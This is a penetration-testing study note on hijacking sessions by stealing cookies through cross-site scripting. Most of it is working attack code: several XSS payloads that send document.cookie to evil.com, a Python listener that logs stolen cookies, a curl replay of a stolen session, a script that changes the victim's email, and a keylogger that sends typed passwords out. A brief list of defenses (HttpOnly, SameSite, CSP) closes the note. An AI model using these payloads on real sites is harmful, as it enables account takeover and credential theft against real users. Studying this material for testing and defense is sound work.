---
tags: [vapt, session-management, xss, intermediate]
difficulty: intermediate
module: "17 - Session Management"
topic: "17.04 Session Hijacking via Cookie Theft (XSS)"
---

# 17.04 — Session Hijacking via Cookie Theft (XSS)

## How Cookie Theft Works

```
SESSION HIJACKING:
  Session ID is the key to a user's session
  If attacker steals it → they can impersonate the user
  
XSSMETHODS FOR COOKIE THEFT:
  Most common: XSS (Cross-Site Scripting) → inject JS → steal cookie
  Network: Sniff HTTP traffic (no HTTPS) → see cookie in headers
  Man-in-the-Middle: Intercept HTTPS + SSL strip (HSTS bypass)
  Physical: Read browser saved cookies from filesystem
  CSRF + other: Use session in same-origin context
  
THE CLASSIC XSS COOKIE THEFT PAYLOAD:
  <script>document.location='https://evil.com/?c='+document.cookie</script>
  
  When victim loads this:
  → Their browser makes a GET request to evil.com
  → Cookie value in URL parameter → attacker sees it in logs!
```

---

## XSS Payload for Cookie Theft

```javascript
// BASIC (works if no CSP, no HttpOnly on session cookie):
<script>
document.location='https://evil.com/steal?cookie='+encodeURIComponent(document.cookie)
</script>

// USING IMAGE (shorter, avoids some filters):
<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">

// USING FETCH (bypasses some CSP img-src restrictions):
<script>
fetch('https://evil.com/?c='+encodeURIComponent(document.cookie))
</script>

// HIDDEN (no redirect, user stays on page):
<script>
new Image().src='https://evil.com/?c='+encodeURIComponent(document.cookie);
</script>

// XSS + SESSION HIJACK FULL CHAIN:
// 1. Find XSS: https://target.com/search?q=<xss_payload>
// 2. Victim visits malicious URL (or attacker-stored XSS fires)
// 3. Victim's browser executes JS
// 4. JS sends cookie to attacker's server
// 5. Attacker uses stolen cookie → hijacks session!
```

---

## Setting Up the Receiver

```bash
# SIMPLE PYTHON RECEIVER:
python3 -c "
import http.server
import urllib.parse

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if 'c' in params:
            print('[!] STOLEN COOKIE:', params['c'][0])
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args):
        pass  # silence default logs

http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
"

# OR: Use Burp Collaborator (no server setup needed!)
# Payload: <img src=x onerror="fetch('https://YOUR_COLLAB.burpcollaborator.net/'+document.cookie)">
# Check Collaborator → stolen cookie in DNS/HTTP interaction!

# USE STOLEN COOKIE:
# In Burp → Repeater → Add Cookie header:
curl https://target.com/account \
  -H "Cookie: session=STOLEN_SESSION_VALUE"
# → If valid → you're logged in as victim!
```

---

## HttpOnly — The Defense and Its Limits

```
HTTPONLY FLAG ON SESSION COOKIE:
  Set-Cookie: session=ABC; HttpOnly
  
  → JavaScript CANNOT read document.cookie for this cookie
  → Classic XSS cookie theft FAILS!
  
  <script>document.cookie</script>  → empty string (HttpOnly cookies hidden)
  
BUT:
  HttpOnly protects against READING via JS
  XSS can STILL do damage:
  - Make authenticated requests (CSRF-like via fetch/XHR)
  - Steal other non-HttpOnly cookies
  - Perform actions AS the victim (change email, drain account)
  - Steal CSRF tokens from the page
  
  Also: HttpOnly doesn't protect against network-based theft!
```

---

## Beyond Direct Cookie Theft

```
WHEN SESSION COOKIE IS HTTPONLY:
  XSS can still hijack the session INDIRECTLY:

// 1. MAKE AUTHENTICATED REQUESTS ON VICTIM'S BEHALF:
fetch('/api/user/change-email', {
    method: 'POST',
    credentials: 'include',  // sends HttpOnly cookies automatically!
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
})
// Cookie sent automatically by browser (even HttpOnly) for same-origin requests!

// 2. STEAL CSRF TOKEN FROM PAGE:
const csrf = document.querySelector('meta[name="csrf-token"]').content;
// Now use it in authenticated request above!

// 3. STEAL OTHER COOKIES (non-HttpOnly):
// localStorage items, sessionStorage, other cookies without HttpOnly

// 4. KEYLOG TO GET PASSWORD:
document.querySelectorAll('input[type=password]').forEach(
    el => el.addEventListener('input', e => {
        fetch('https://evil.com/?p=' + e.target.value)
    })
)
```

---

## Fix

```
DEFENSES:
  ✓ HttpOnly on session cookies (prevents direct cookie theft)
  ✓ Secure flag (cookie only sent over HTTPS)
  ✓ SameSite=Lax or Strict (reduces CSRF-like abuse)
  ✓ Content Security Policy (prevents exfiltration even if XSS exists):
    Content-Security-Policy: connect-src 'self'; img-src 'self'
    → XSS can't send data to external domains!
  ✓ Fix XSS vulnerabilities (see Module 07 - XSS)
  ✓ Short session lifetime (stolen cookie expires fast)
  ✓ Bind session to user agent + IP:
    (Controversial — breaks legitimate users too, but increases attacker effort)
```

---

## Related Notes
- [[Module 07 - XSS]] — how to find XSS
- [[05 - Session Hijacking via Network Sniffing]] — network-based theft
- [[11 - Cookie Flags Attack Scenarios]] — HttpOnly, Secure, SameSite
- [[15 - Defense Secure Session Configuration]] — full hardening
